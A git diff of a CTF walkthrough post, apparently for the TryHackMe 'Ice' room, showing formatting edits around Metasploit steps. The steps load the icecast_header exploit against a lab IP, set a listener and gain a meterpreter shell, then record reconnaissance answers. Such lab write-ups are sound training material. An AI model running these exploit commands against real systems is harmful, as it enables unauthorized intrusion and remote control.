@@ -14,7 +14,7 @@ tags:
   - CTF
   - Privilege Escalation
   - Machines
-#teaser: assets/images/thm/thm-ice-00.png  Path to the teaser image
+teaser: assets/images/thm/thm-ice-00.png  
 tagline: "ICE - Tryhackme Walkthrough by Nisha."
 header:
   overlay_filter: rgba(0, 0, 0, 0.5)
@@ -74,7 +74,7 @@ An NMAP scan reveals the following ports were discovered to be open:
 In this task we must find a way to exploit any vulnerable services on the target to gain a foothold. The cvedetails website reveals that the impact score and the CVE number for this vulnerability as displayed in the image below. 
 
 
-<strong> Q: What is the Impact Score for this vulnerability? Use <a href="https://www.cvedetails.com">https://www.cvedetails.com> </a> for this question and the next.  </strong><br>
+<strong> Q: What is the Impact Score for this vulnerability? Use <a href="https://www.cvedetails.com">https://www.cvedetails.com </a> for this question and the next.  </strong><br>
 <em> Answer: 6.4 </em>
 
 <img src="/assets/images/thm/thm-ice-6.png">
@@ -94,21 +94,21 @@ Type "msfconsole" to launch the Metasploit Framework. <br>
 
 <img src="/assets/images/thm/thm-ice-8.png">
 
-<strong> # use exploit/windows/http/icecast_header </strong> <br>
+> use exploit/windows/http/icecast_header  
 
 <img src="/assets/images/thm/thm-ice-9.png">
 
-<strong> # set RHOSTS <em>targetIPaddress </em> </strong> <br>
+> set RHOSTS 10.2.119.123
 <img src="/assets/images/thm/thm-ice-10.png">
 
-<strong> # set LHOST <em> attackerIPaddress or interface </em> </strong> <br>
+> set LHOST tun0
 
 <img src="/assets/images/thm/thm-ice-11.png">
 
 
-<strong> # set LHOST <em> attackerIPaddress or interface </em> </strong> <br>
+<strong> # set LHOST <em> attackerIPaddress or interface  
 
-<strong> # exploit </strong> <br>
+> exploit 
 
 <img src="/assets/images/thm/thm-ice-12.png">
 
@@ -123,7 +123,7 @@ Type "msfconsole" to launch the Metasploit Framework. <br>
 <em> Answer: meterpreter </em>
 
 
-<strong> > getuid </strong> <br>
+ > getuid 
 
 <strong> Q: What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module. </strong><br>
 <em> Answer: Dark </em>
@@ -154,9 +154,6 @@ Now that we know the architecture of the process, let's perform some further rec
 <strong> Q: What build of Windows is the system? </strong><br>
 <em> Answer: 7601 </em>
 
-<strong> Q: What build of Windows is the system? </strong><br>
-<em> Answer: 7601 </em>
-
 
 
 <img src="/assets/images/thm/thm-ice-15.png">
@@ -168,6 +165,12 @@ Now that we know the architecture of the process, let's perform some further rec
 
 
 ## Task 5 - Looting
+
+
+<img src="/assets/images/thm/thm-ice-19.png">
+
+
+
 
 ## Task 6 - Post-Exploitation
 
